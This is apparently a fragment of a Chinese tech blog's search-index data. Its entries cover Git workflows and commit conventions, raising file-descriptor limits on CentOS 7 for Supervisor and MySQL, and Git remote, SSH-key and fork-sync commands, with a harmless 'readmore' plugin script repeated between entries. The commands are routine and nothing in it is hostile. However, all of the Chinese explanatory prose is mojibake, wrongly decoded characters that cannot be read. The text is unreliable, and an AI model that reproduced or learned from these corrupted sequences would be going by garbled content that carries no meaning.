å·¥ä½œæµåˆ†ç±»é›†ä¸­å¼å·¥ä½œæµåƒ Subversion ä¸€æ ·ï¼Œé›†ä¸­å¼å·¥ä½œæµä»¥ä¸­å¤®ä»“åº“ä½œä¸ºé¡¹ç›®æ‰€æœ‰ä¿®æ”¹çš„å•ç‚¹å®ä½“ã€‚æ‰€æœ‰ä¿®æ”¹éƒ½æäº¤åˆ° Master è¿™ä¸ªåˆ†æ”¯ä¸Šï¼Œè¿™ç§æ–¹å¼ä¸ SVN çš„ä¸»è¦åŒºåˆ«å°±æ˜¯å¼€å‘äººå‘˜æœ‰æœ¬åœ°åº“ï¼Œä½† Git å¾ˆå¤šç‰¹æ€§å¹¶æ²¡æœ‰ä½¿ç”¨åˆ°ã€‚ åŠŸèƒ½åˆ†æ”¯å·¥ä½œæµåŠŸèƒ½åˆ†æ”¯å·¥ä½œæµä»¥é›†ä¸­å¼å·¥ä½œæµä¸ºåŸºç¡€ï¼Œä¸åŒçš„æ˜¯ä¸ºå„ä¸ªæ–°åŠŸèƒ½åˆ†é…ä¸€ä¸ªä¸“é—¨çš„åˆ†æ”¯æ¥å¼€å‘ã€‚è¿™æ ·å¯ä»¥åœ¨æŠŠæ–°åŠŸèƒ½é›†æˆåˆ°æ­£å¼é¡¹ç›®å‰ï¼Œç”¨ Pull Requests çš„æ–¹å¼è®¨è®ºå˜æ›´ã€‚ Gitflow å·¥ä½œæµGitflow å·¥ä½œæµé€šè¿‡ä¸ºåŠŸèƒ½å¼€å‘ã€å‘å¸ƒå‡†å¤‡å’Œç»´æŠ¤è®¾ç«‹äº†ç‹¬ç«‹çš„åˆ†æ”¯ï¼Œè®©å‘å¸ƒè¿­ä»£è¿‡ç¨‹æ›´æµç•…ã€‚ä¸¥æ ¼çš„åˆ†æ”¯æ¨¡å‹ä¹Ÿä¸ºå¤§å‹é¡¹ç›®æä¾›äº†ä¸€äº›éå¸¸å¿…è¦çš„ç»“æ„ã€‚ Forking å·¥ä½œæµForking å·¥ä½œæµæ˜¯åœ¨ GitFlow åŸºç¡€ä¸Šï¼Œå……åˆ†åˆ©ç”¨äº† Git åœ¨åˆ†æ”¯å’Œå…‹éš†ä¸Šçš„ä¼˜åŠ¿ã€Git çš„ Fork å’Œ Pull Request åŠŸèƒ½ï¼Œå®ç°ä»£ç å®¡æ ¸çš„ç›®çš„ã€‚å¯ä»¥å®‰å…¨å¯é åœ°ç®¡ç†å¤§å›¢é˜Ÿçš„å¼€å‘è€…ï¼ˆdeveloperï¼‰ï¼Œå¹¶èƒ½æ¥å—ä¸ä¿¡ä»»è´¡çŒ®è€…ï¼ˆcontributorï¼‰çš„æäº¤ã€‚ Pull RequestsPull Requests æ˜¯ Bitbucket æä¾›çš„è®©å¼€å‘è€…æ›´æ–¹ä¾¿åœ°è¿›è¡Œåä½œçš„åŠŸèƒ½ï¼Œæä¾›äº†å‹å¥½çš„ Web ç•Œé¢å¯ä»¥åœ¨æè®®çš„ä¿®æ”¹åˆå¹¶åˆ°æ­£å¼é¡¹ç›®ä¹‹å‰å¯¹ä¿®æ”¹è¿›è¡Œè®¨è®ºã€‚ GitFlow å·¥ä½œæµä¸­åˆ†æ”¯ç±»å‹è¯¦è§£ ä¸»å¹²åˆ†æ”¯ï¼ˆmasterï¼‰ ä¸»è¦è´Ÿè´£ç®¡ç†æ­£åœ¨è¿è¡Œçš„ç”Ÿäº§ç¯å¢ƒä»£ç ï¼Œæ°¸è¿œä¿æŒä¸æ­£åœ¨è¿è¡Œçš„ç”Ÿäº§ç¯å¢ƒå®Œå…¨ä¸€è‡´ã€‚ Bug ä¿®å¤åˆ†æ”¯ï¼ˆhotfixï¼‰ ä¸»è¦è´Ÿè´£ç®¡ç†ç”Ÿäº§ç¯å¢ƒä¸‹éœ€è¦ç´§æ€¥ä¿®å¤çš„ä»£ç ã€‚ä»ä¸»å¹²åˆ†æ”¯åˆ†å‡ºï¼Œä¿®ç†å®Œæ¯•å¹¶æµ‹è¯•ä¸Šçº¿åï¼Œå¹¶å›ä¸»å¹²åˆ†æ”¯ã€‚å¹¶å›åï¼Œè§†æƒ…å†µå¯ä»¥åˆ é™¤è¯¥åˆ†æ”¯ã€‚ å‡†ç”Ÿäº§åˆ†æ”¯ï¼ˆreleaseï¼‰ è¾ƒå¤§çš„ç‰ˆæœ¬ä¸Šçº¿å‰ï¼Œä¼šä»å¼€å‘åˆ†æ”¯ä¸­åˆ†å‡ºå‡†ç”Ÿäº§åˆ†æ”¯ï¼ˆé¢„å‘å¸ƒåˆ†æ”¯ï¼‰ï¼Œè¿›è¡Œæœ€åé˜¶æ®µçš„é›†æˆæµ‹è¯•ã€‚è¯¥ç‰ˆæœ¬ä¸Šçº¿åï¼Œä¼šåˆå¹¶åˆ°ä¸»å¹²åˆ†æ”¯ã€‚ç”Ÿäº§ç¯å¢ƒè¿è¡Œä¸€æ®µé˜¶æ®µè¾ƒç¨³å®šåå¯ä»¥è§†æƒ…å†µåˆ é™¤ã€‚ å¼€å‘åˆ†æ”¯ï¼ˆdevelopï¼‰ ä¸»è¦è´Ÿè´£ç®¡ç†æ­£åœ¨å¼€å‘è¿‡ç¨‹ä¸­çš„ä»£ç ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åº”è¯¥æ˜¯æœ€æ–°çš„ä»£ç ã€‚ åŠŸèƒ½åˆ†æ”¯ï¼ˆfeatureï¼‰ ä¸ºäº†ä¸å½±å“è¾ƒçŸ­å‘¨æœŸçš„å¼€å‘å·¥ä½œï¼Œä¸€èˆ¬æŠŠä¸­é•¿æœŸå¼€å‘æ¨¡å—ï¼Œä¼šä»å¼€å‘åˆ†æ”¯ä¸­ç‹¬ç«‹å‡ºæ¥ï¼Œå¼€å‘å®Œæˆåä¼šåˆå¹¶åˆ°å¼€å‘åˆ†æ”¯ã€‚ åˆ†æ”¯è¯¦ç»†å›¾è§£ Git æäº¤è§„èŒƒ feat å¢åŠ æ–°åŠŸèƒ½ fix ä¿®å¤é—®é¢˜ / BUG style ä»£ç é£æ ¼ç›¸å…³æ— å½±å“è¿è¡Œç»“æœçš„ perf ä¼˜åŒ– / æ€§èƒ½æå‡ refactor é‡æ„ revert æ’¤é”€ä¿®æ”¹ test æµ‹è¯•ç›¸å…³ docs æ–‡æ¡£ / æ³¨é‡Š build å¯¹æ„å»ºç³»ç»Ÿæˆ–è€…å¤–éƒ¨ä¾èµ–é¡¹è¿›è¡Œäº†ä¿®æ”¹ chore ä¾èµ–æ›´æ–° / è„šæ‰‹æ¶é…ç½®ä¿®æ”¹ç­‰ workflow å·¥ä½œæµæ”¹è¿› ci æŒç»­é›†æˆ types ç±»å‹å®šä¹‰æ–‡ä»¶æ›´æ”¹ wip å¼€å‘ä¸­ å‚è€ƒåšå®¢ æ·±å…¥ç†è§£å­¦ä¹  Git å·¥ä½œæµï¼ˆgit-workflow-tutorialï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç‰ˆæœ¬æ§åˆ¶"},{title:"å¸¸ç”¨å¼€å‘å¸®åŠ©æ–‡æ¡£æ•´ç†",url:"/posts/d4da5eed.html",text:'Git Git èµ„æ–™æ•´ç† Pro Git Book C++ C++ å¸®åŠ©æ‰‹å†Œ C/C++ å‚è€ƒæ‰‹å†Œ Docker èœé¸Ÿæ•™ç¨‹ - Docker å‘½ä»¤å¤§å…¨ Kubernetes ä¸­æ–‡æŒ‡å— / äº‘åŸç”Ÿåº”ç”¨æ¶æ„å®è·µæ‰‹å†Œ Jenkins Jenkins å®˜æ–¹è‹±æ–‡æ–‡æ¡£ Jenkins å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Jenkins ä¸­æ–‡æ–‡æ¡£ Apache Ignite Apache Ignite å®˜æ–¹è‹±æ–‡æ–‡æ¡£ Apache Ignite ä¸­æ–‡æ–‡æ¡£ MyBatis MyBatis3 å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ IntelliJ IDEA IntelliJ IDEA å®˜æ–¹è‹±æ–‡æ–‡æ¡£ Gradle Gradle ä¸­æ–‡æ•™ç¨‹ Puppeteer Puppeteer å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Redis Redis å‘½ä»¤å‚è€ƒ Redis å‘½ä»¤ä½¿ç”¨æ‰‹å†Œ Reids èœé¸Ÿæ•™ç¨‹æ–‡æ¡£ RocksDB RocksDB ä¸­æ–‡æ–‡æ¡£ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘éšç¬”"},{title:"Centos7 æ›´æ”¹æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•°",url:"/posts/88a10b.html",text:'ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux ä¸´æ—¶æ›´æ”¹æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° 12345# æŸ¥çœ‹é™åˆ¶# ulimit -n# ä¸´æ—¶æ›´æ”¹é™åˆ¶ï¼ˆç³»ç»Ÿé‡å¯å¤±æ•ˆï¼‰# ulimit -n 1048576 æ°¸ä¹…æ›´æ”¹æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° 1234567891011121314151617181920# ç¬¬ä¸€æ­¥# vim /etc/security/limits.conf* soft nofile 1048576* hard nofile 1048576 #æ˜Ÿå·è¡¨ç¤ºå¯¹æ‰€æœ‰ç”¨æˆ·ç”Ÿæ•ˆ# ç¬¬äºŒæ­¥# vim /etc/sysctl.conffs.file-max = 1048576 #å¯æ‰§è¡Œ"sysctl -p"ä½¿fs.file-maxç”Ÿæ•ˆ# ç¬¬ä¸‰æ­¥# vim /etc/pam.d/loginsession required pam_limits.so #æŸ¥çœ‹é…ç½®æ–‡ä»¶æœ‰æ²¡æœ‰è¿™è¡Œï¼Œæ²¡æœ‰å°±åŠ ä¸Š# ç¬¬å››æ­¥# reboot #é‡å¯ç³»ç»Ÿ# ç¬¬äº”æ­¥ï¼ˆæŸ¥çœ‹æ˜¯å¦ç”Ÿæ•ˆï¼‰# ulimit -n# sysctl fs.file-max# cat /proc/PID/limits #PIDæ˜¯åº”ç”¨çš„è¿›ç¨‹IDï¼Œåœ¨è¾“å‡ºç»“æœä¸­æŸ¥çœ‹"Max open files"çš„æ˜¾ç¤ºå€¼ (adsbygoogle = window.adsbygoogle || []).push({}); æ›´æ”¹ Supervisor çš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° 1234567891011121314# å¦‚æœåº”ç”¨ä½¿ç”¨supervisoræ¥ç®¡ç†ï¼Œåˆ™éœ€è¦æŒ‰ä»¥ä¸‹æ­¥éª¤é…ç½®ï¼Œå¦åˆ™ä¸Šé¢çš„é…ç½®å¯¹ä½¿ç”¨supervisorç®¡ç†çš„åº”ç”¨ä¸ç”Ÿæ•ˆ# ä¿®æ”¹supervisorçš„é…ç½®æ–‡ä»¶# vim /etc/supervisord.confminfds=1048576# ä¿®æ”¹supervisorçš„systemctlå¯åŠ¨è„šæœ¬ï¼Œæ·»åŠ LimitNOFILEå±æ€§# vim /usr/lib/systemd/system/supervisord.service[Service]LimitNOFILE=1048576# é‡å¯supervisordç”Ÿæ•ˆ# systemctl daemon-reload# systemctl restart supervisord æ›´æ”¹ MySQLï¼ˆRPM æ–¹å¼å®‰è£…ï¼‰çš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•° 12345678910111213141516171819# å¦‚æœæ˜¯é€šè¿‡yumæºæˆ–è€…rpmåŒ…çš„æ–¹å¼å®‰è£…mysqlï¼Œé‚£ä¹ˆä¸Šé¢çš„é…ç½®å¯¹mysqlæ— æ•ˆï¼Œå› ä¸ºsystemctlå¯åŠ¨è„šæœ¬è¦†ç›–äº†ulimité…ç½®# æŸ¥çœ‹mysqlçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦æ•°# cat /proc/`pidof mysqld`/limits# egrep \'^(Limit|Max open files)\' /proc/`pidof mysqld`/limits# ç¬¬ä¸€ç§æ–¹æ³•ï¼šç›´æ¥ä¿®æ”¹mysqlçš„systemctlå¯åŠ¨è„šæœ¬ï¼ˆä¸å»ºè®®ä¿®æ”¹mysqld.serviceï¼Œè¿™æ ·ä¼šå½±å“ä¸‹æ¬¡å‡çº§ï¼‰# vim /usr/lib/systemd/system/mysqld.serviceLimitNOFILE=1048576# ç¬¬äºŒç§æ–¹æ³•ï¼šå®Œç¾è§£å†³å‡çº§é—®é¢˜# mkdir /usr/lib/systemd/system/mysqld.service.d# vim /usr/lib/systemd/system/mysqld.service.d/override.conf[Service]LimitNOFILE=1048576# é‡å¯mysqlç”Ÿæ•ˆ# systemctl daemon-reload# systemctl restart mysqld var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Git ä¹‹å›› - Git å¯¹ Github è¿œç¨‹åº“çš„æ“ä½œ",url:"/posts/a288950b.html",text:'Git çš„å››ä¸ªå·¥ä½œåŒºåŸŸ åˆ›å»ºè¿œç¨‹åº“ä¸æœ¬åœ°åº“12345# ç™»å½•Githubçš„Webé¡µé¢åˆ›å»ºè¿œç¨‹åº“ï¼Œå¹¶è®°å½•å¦‚ä¸‹çš„è¿œç¨‹åº“åœ°å€# https://github.com/xxxx/remote-test.git# åˆ›å»ºæœ¬åœ°åº“ï¼Œå»ºè®®æœ¬åœ°åº“çš„åç§°ä¸è¿œç¨‹åº“çš„åç§°ä¸€è‡´$ git init remote-test Git é…ç½®è¿œç¨‹åº“åˆ«å1234567891011121314# è¿›å…¥æœ¬åœ°åº“çš„æ ¹ç›®å½•$ cd remote-test# æŸ¥çœ‹è¿œç¨‹åº“åˆ«å$ git remote -v# æ·»åŠ è¿œç¨‹åº“åˆ«åï¼Œä¾‹å¦‚ä¸‹é¢è¿œç¨‹åº“çš„åˆ«åæ˜¯originï¼Œåœ°å€æ˜¯Githubè¿œç¨‹ä»“åº“çš„Https URL$ git remote add origin https://github.com/xxxx/remote-test.git# åˆ é™¤è¿œç¨‹åº“åˆ«å$ git remote rm origin# é‡å‘½åè¿œç¨‹åº“åˆ«å$ git remote rename origin origin2 Git è¿œç¨‹åº“çš„ Pull ä¸ Push æ“ä½œ1234567891011121314151617# è¿›å…¥æœ¬åœ°åº“çš„æ ¹ç›®å½•$ cd remote-test# ä»è¿œç¨‹åº“originçš„masteråˆ†æ”¯Pullï¼ˆæ‹‰å–ï¼‰æœ€æ–°åˆ°å·¥ä½œåŒºï¼Œå¹¶åœ¨å·¥ä½œåŒºè¿›è¡Œåˆå¹¶(Merge)æ“ä½œï¼Œoriginæ˜¯è¿œç¨‹åº“åˆ«åï¼Œmasteræ˜¯è¿œç¨‹åº“åˆ†æ”¯çš„åç§°$ git pull origin master# åˆ›å»ºæ–°æ–‡ä»¶$ touch api.json# æ·»åŠ æ–°æ–‡ä»¶åˆ°æš‚å­˜åŒº$ git add api.json# æ·»åŠ æ–°æ–‡ä»¶åˆ°æœ¬åœ°åº“$ git commit api.json -m \'update\'# å°†æœ€æ–°çš„æ–‡ä»¶Pushï¼ˆæ¨é€ï¼‰åˆ°è¿œç¨‹åº“originçš„masteråˆ†æ”¯ï¼Œoriginæ˜¯è¿œç¨‹åº“åˆ«åï¼Œmasteræ˜¯è¿œç¨‹åº“åˆ†æ”¯çš„åç§°ï¼›å¦‚æœPullåˆ°Githubçš„è¿œç¨‹ä»“åº“ï¼ˆHttps URLï¼‰ï¼Œé»˜è®¤ä¼šæç¤ºè¾“å…¥Githubçš„å¸å·å’Œå¯†ç $ git push origin master Git è¿œç¨‹åº“çš„ Clone æ“ä½œ12345678910# å°†è¿œç¨‹åº“Cloneåˆ°æœ¬åœ°ï¼Œé»˜è®¤åˆ†æ”¯æ˜¯master$ git clone https://github.com/xxxx/remote-test.git# æˆ–è€…Cloneè¿œç¨‹åº“åˆ°æœ¬åœ°ï¼Œå¹¶æŒ‡å®šæœ¬åœ°ç›®å½•çš„åç§°ï¼Œé»˜è®¤åˆ†æ”¯æ˜¯master$ git clone https://github.com/xxxx/remote-test.git remote-project# ä¸Šè¿°å‘½ä»¤çš„ä½œç”¨ï¼š# åˆå§‹åŒ–æœ¬åœ°åº“ï¼Œå³æ‰§è¡Œ"git init"å‘½ä»¤# å®Œæ•´åœ°æŠŠè¿œç¨‹åº“çš„masteråˆ†æ”¯Pullä¸‹æ¥ï¼Œå³æ‰§è¡Œ"git pull"å‘½ä»¤# åˆ›å»ºè¿œç¨‹åº“åˆ«åï¼ˆorigin + è¿œç¨‹åº“åœ°å€ï¼‰ï¼Œå³æ‰§è¡Œ"git remote add"å‘½ä»¤ Git è¿œç¨‹åº“çš„ Fetch æ“ä½œ12345678910111213141516# é¦–æ¬¡æ‰§è¡Œä¼šåˆ›å»ºæœ¬åœ°åº“originçš„masteråˆ†æ”¯ï¼ˆorigin/masterï¼‰ï¼Œç„¶åä»è¿œç¨‹åº“originçš„masteråˆ†æ”¯Fetchï¼ˆæŠ“å–ï¼‰æœ€æ–°åˆ°æœ¬åœ°åº“originçš„masteråˆ†æ”¯ï¼ˆorigin/masterï¼‰ï¼Œä¸å½±å“å½“å‰å·¥ä½œåŒºçš„å†…å®¹$ git fetch origin master# æŸ¥çœ‹æœ¬åœ°åº“çš„masteråˆ†æ”¯ä¸æœ¬åœ°åº“originçš„masteråˆ†æ”¯ï¼ˆorigin/masterï¼‰çš„å·®å¼‚$ git diff master origin/master# æˆ–è€…$ git diff HEAD FETCH_HEAD# åˆå¹¶æœ¬åœ°åº“originçš„masteråˆ†æ”¯ï¼ˆorigin/masterï¼‰åˆ°æœ¬åœ°åº“çš„masteråˆ†æ”¯$ git merge origin/master# æˆ–è€…$ git merge FETCH_HEAD# æŒ‡ä»¤Pullä¸Fetchçš„åŒºåˆ«ï¼š Pull = Fetch + Merge è§£å†³ Pull æ“ä½œäº§ç”Ÿçš„å†²çªPull = Fetch + Mergeï¼Œä¹Ÿå°±æ˜¯è¯´æ ¹æœ¬é—®é¢˜æ˜¯ â€œå¦‚ä½•è§£å†³åˆå¹¶åˆ†æ”¯åäº§ç”Ÿçš„å†²çªâ€ 12345678910111213141516# ä»è¿œç¨‹åº“originçš„masteråˆ†æ”¯Pullï¼ˆæ‹‰å–ï¼‰æœ€æ–°åˆ°å·¥ä½œåŒºï¼Œå¹¶åœ¨å·¥ä½œåŒºè¿›è¡Œåˆå¹¶(Merge)æ“ä½œï¼Œå‡è®¾æ­¤æ—¶Gitæç¤ºæœ‰æ–‡ä»¶äº§ç”Ÿå†²çª# git pull origin master# ç¬¬ä¸€æ­¥ï¼Œæ‰‹åŠ¨ç¼–è¾‘äº§ç”Ÿå†²çªçš„æ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œç›´è‡³å†²çªçš„æ–‡ä»¶å†…å®¹éƒ½ä¿®æ”¹æ‰$ vim api.json&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADedit by hot_fix s=======edit by hot_fix2&gt;&gt;&gt;&gt;&gt;&gt;&gt; master# ç¬¬äºŒæ­¥ï¼Œæ ‡è®°å†²çªå·²è§£å†³ï¼Œå°†ä¹‹å‰äº§ç”Ÿå†²çªçš„æ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒº$ git add api.json# ç¬¬ä¸‰æ­¥ï¼Œæäº¤ä¿®æ”¹ï¼Œæ­¤æ—¶commitå‚æ•°ä¸èƒ½å¸¦å…·ä½“æ–‡ä»¶å$ git commit -m \'update message\' è§£å†³ Push å¤±è´¥çš„é—®é¢˜å¦‚æœä¸æ˜¯åŸºäºè¿œç¨‹åº“çš„æœ€æ–°ç‰ˆæœ¬æ‰€åšçš„ä¿®æ”¹ï¼Œä¸èƒ½è¿›è¡Œ Push æ“ä½œï¼Œå¿…é¡»å…ˆå°†è¿œç¨‹åº“æœ€æ–°ç‰ˆæœ¬çš„æ–‡ä»¶ Pull ä¸‹æ¥å†è¿›è¡Œ Push æ“ä½œã€‚Pull ä¸‹æ¥ä¹‹åå¦‚æœæ–‡ä»¶äº§ç”Ÿå†²çªï¼Œåˆ™æŒ‰ç…§ä¸Šé¢â€ è§£å†³ Pull æ“ä½œäº§ç”Ÿçš„å†²çªâ€ çš„æ­¥éª¤è¿›è¡Œæ“ä½œã€‚ Git è¿œç¨‹åº“çš„åˆ†æ”¯åˆ›å»ºæ“ä½œ1234567891011121314# æœ¬åœ°åˆ›å»ºåˆ†æ”¯$ git branch develop# æœ¬åœ°åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯$ git checkout develop# å°†åˆ†æ”¯ä»£ç æ·»åŠ åˆ°æš‚å­˜åŒº$ git add --all# å°†åˆ†æ”¯ä»£ç æäº¤åˆ°æœ¬åœ°åº“$ git commit -am \'create branch develop\'# å°†åˆ†æ”¯ä»£ç Pushåˆ°è¿œç¨‹åº“çš„åˆ†æ”¯ï¼Œæ­¤æ—¶è¿œç¨‹åº“ä¼šè‡ªåŠ¨åˆ›å»ºåˆ†æ”¯$ git push origin develop SSH å…å¯†ç ç™»å½• Githubå½“è¿œç¨‹åº“çš„åœ°å€æ˜¯åŸºäº HTTPS åè®®çš„æ—¶å€™ï¼Œæ¯æ¬¡ Push æ“ä½œéƒ½éœ€è¦æ‰‹åŠ¨è¾“å…¥ Github çš„ç”¨æˆ·åå’Œå¯†ç ï¼›Windows ç³»ç»Ÿä¸‹ä¼šè‡ªåŠ¨ä¿å­˜å‡­æ®ï¼ˆå¸å·ä¿¡æ¯ï¼‰ï¼Œå¯ä»¥é¿å…æ¯æ¬¡éƒ½æ‰‹åŠ¨è¾“å…¥å¸å·ä¿¡æ¯ï¼›è€Œ Linux ä¸‹åˆ™æ²¡æœ‰è‡ªåŠ¨ä¿å­˜å‡­æ®çš„åŠŸèƒ½ï¼Œå› æ­¤ Github å®˜æ–¹æä¾›äº†åŸºäº SSH å…å¯†ç ç™»å½•çš„æ–¹å¼è¿›è¡Œ Push æ“ä½œï¼Œä»¥æ­¤æ¥è§£å†³æ¯æ¬¡éƒ½è¦è¾“å…¥å¸å·ä¿¡æ¯çš„é—®é¢˜ï¼›SSH å…å¯†ç ç™»å½•çš„æ–¹å¼åŒæ ·é€‚ç”¨äº Windows ç³»ç»Ÿï¼Œæ­¤æ–¹æ³•çš„å±€é™æ€§åœ¨äºæœ¬åœ°åªèƒ½æ“ä½œä¸€ä¸ª Github å¸å·ã€‚ 12345678910111213141516171819202122$ cd ~/.ssh# ç”ŸæˆSSHçš„å…¬é’¥æ–‡ä»¶id_rsa.pubä¸ç§é’¥æ–‡ä»¶id_rsaï¼Œå¹¶æŒ‡å®šé‚®ç®±åœ°å€$ ssh-keygen -t rsa -C xxxx@gmail.com# æˆ–è€…æŒ‡å®šå…¬é’¥å’Œç§é’¥æ–‡ä»¶çš„æ–‡ä»¶å$ ssh-keygen -t rsa -C xxxx@gmail.com -f id_rsa.github# å°†å…¬é’¥æ–‡ä»¶id_rsa.pubçš„æ–‡æœ¬å†…å®¹å¤åˆ¶åˆ°Githubç›¸åº”çš„SSH Keysé…ç½®é¡µé¢$ cat id_rsa.pub# è¿›å…¥æœ¬åœ°åº“çš„æ ¹ç›®å½•$ cd remote-test# åˆ é™¤æ—§çš„è¿œç¨‹åº“åˆ«å$ git remote rm origin# æ·»åŠ æ–°çš„è¿œç¨‹åº“åˆ«åï¼Œè¿œç¨‹åº“çš„åœ°å€åŸºäºSSHåè®®$ git remote add origin git@github.com:xxxx/remote-test.git# æµ‹è¯•ä½¿ç”¨â€œSSHå…å¯†ç ç™»å½•â€çš„æ–¹å¼è¿›è¡ŒPushæ“ä½œ$ git push origin master Github Fork çš„é¡¹ç›®å’Œä¸Šæ¸¸é¡¹ç›®åŒæ­¥ä»£ç å½“æˆåŠŸ Fork ä¸€ä¸ªé¡¹ç›®åï¼Œæ— è®ºæ€ä¹ˆä¿®æ”¹ Fork å‡ºæ¥çš„é¡¹ç›®ï¼ŒåŸæ¥çš„é¡¹ç›®ï¼ˆGithub å«åš upstreamï¼Œä¸€èˆ¬è¯‘ä½œä¸Šæ¸¸é¡¹ç›®ï¼‰æ˜¯ä¸ä¼šå—åˆ°å½±å“çš„ï¼Œè¿™åœ¨ä¸Šæ¸¸é¡¹ç›®æ¥è¯´è‡ªç„¶æ˜¯æå¥½çš„ä¿æŠ¤ã€‚ä½†æ˜¯ Fork å‡ºæ¥çš„é¡¹ç›®å¦‚ä½•èƒ½å¤ŸåŠæ—¶åæ˜ ä¸Šæ¸¸é¡¹ç›®çš„å˜æ›´å‘¢ï¼Ÿè¿™å°±é¦–å…ˆéœ€è¦è®¾ç½®æœ¬åœ°é¡¹ç›®çš„ â€œè¿œç¨‹ä»“åº“â€ å±æ€§ï¼Œå³å‘Šè¯‰ Git å‘½ä»¤ï¼Œæœ¬åœ°é¡¹ç›®çš„ä¸Šæ¸¸é¡¹ç›®æ˜¯å“ªä¸€ä¸ªï¼Œæ¯”å¦‚ä¸‹é¢é’ˆå¯¹ weld-core é¡¹ç›®ä¸¾ä¾‹ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# è®¾ç½®ä¸Šæ¸¸çš„è¿œç¨‹ä»“åº“$ git remote add upstream https://github.com/weld/core# æŸ¥çœ‹æ‰€æœ‰è¿œç¨‹ä»“åº“$ git remote -vorigin https://github.com/subaochen/core.git (fetch)origin https://github.com/subaochen/core.git (push)upstream https://github.com/weld/core (fetch)upstream https://github.com/weld/core (push)# å°†ä¸Šæ¸¸è¿œç¨‹ä»“åº“çš„æœ€æ–°å˜åŒ–åŒæ­¥åˆ°æœ¬åœ°$ git fetch upstream# æŸ¥çœ‹å½“å‰é¡¹ç›®çš„æ‰€æœ‰åˆ†æ”¯$ git branch -a* 2.0 remotes/origin/1.1 remotes/origin/1.2 remotes/origin/2.0 remotes/origin/2.0.0 remotes/origin/2.0.0.Beta5-branch remotes/origin/HEAD -&amp;gt; origin/2.0 remotes/origin/master remotes/upstream/1.1 remotes/upstream/1.2 remotes/upstream/2.0 remotes/upstream/2.0.0 remotes/upstream/2.0.0.Beta5-branch remotes/upstream/2.1 remotes/upstream/2.2 remotes/upstream/2.2.0 remotes/upstream/2.3 remotes/upstream/eap6.2.x remotes/upstream/master remotes/upstream/weld-osgi-2.x# ç¡®ä¿æœ¬åœ°ä»£ç çš„åˆ†æ”¯è®¾ç½®å¾—å½“ï¼Œä¸€èˆ¬è®¾ç½®ä¸º origin/master$ git checkout origin/master# åˆå¹¶ä¸Šæ¸¸è¿œç¨‹ä»“åº“å’Œæœ¬åœ°ä»“åº“çš„ä»£ç ï¼ˆå³å°†åˆ†æ”¯ origin/master ä¸ upstream/master åˆå¹¶åœ¨ä¸€èµ·ï¼‰$ git merge upstream/master# æäº¤æœ¬åœ°å˜æ›´ï¼ŒPush ä»£ç åˆ° origin/master$ git push origin master# å…¶å®åŒæ­¥ä¸Šæ¸¸è¿œç¨‹ä»“åº“ä»£ç çš„æ­¥éª¤ï¼Œå¯ä»¥åˆå¹¶æˆä¸€æ¡å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ç›¸å½“äºä¸Šé¢çš„ï¼šfetch + merge# ç¬¬ä¸€ä¸ªå‚æ•° pustream è¡¨ç¤ºè¿œç¨‹ä»“åº“çš„ upstram/master åˆ†æ”¯# ç¬¬äºŒä¸ªå‚æ•° master è¡¨ç¤ºæœ¬åœ° Fork åº“çš„ origin/master åˆ†æ”¯$ git pull upstream master Git ä»è¿œç¨‹ä»“åº“è·å–ç‰¹å®šåˆ†æ”¯12345678910# åˆ—å‡ºè¿œç¨‹ä»“åº“çš„æ‰€æœ‰åˆ†æ”¯$ git branch -aremotes/origin/devremotes/origin/release# 